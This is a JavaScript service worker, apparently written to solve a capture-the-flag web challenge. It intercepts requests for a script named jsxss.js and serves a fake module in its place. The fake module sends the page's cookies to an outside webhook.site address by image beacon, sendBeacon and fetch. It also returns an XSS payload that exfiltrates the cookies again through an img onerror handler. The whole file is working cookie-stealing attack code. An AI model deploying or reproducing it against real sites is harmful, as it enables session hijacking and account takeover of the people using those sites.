self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
    const fakeModule = `
      export default function(input) {
        var cookie = encodeURIComponent(document.cookie || 'NO_COOKIE_FOUND');
        var url = 'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=' + cookie;
        
        // Method 1: Image Beacon
        new Image().src = url;
        
        // Method 2: Synchronous navigator.sendBeacon (persists even if tab closes!)
        if (navigator.sendBeacon) { navigator.sendBeacon(url); }
        
        // Method 3: Fetch with keepalive flag
        fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){});

        return '<img src=x onerror="var c=encodeURIComponent(document.cookie);new Image().src=\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c;if(navigator.sendBeacon)navigator.sendBeacon(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c);">';
      }
    `;
    event.respondWith(
      new Response(fakeModule, {
        headers: { 'Content-Type': 'application/javascript' }
      })
    );
  }
});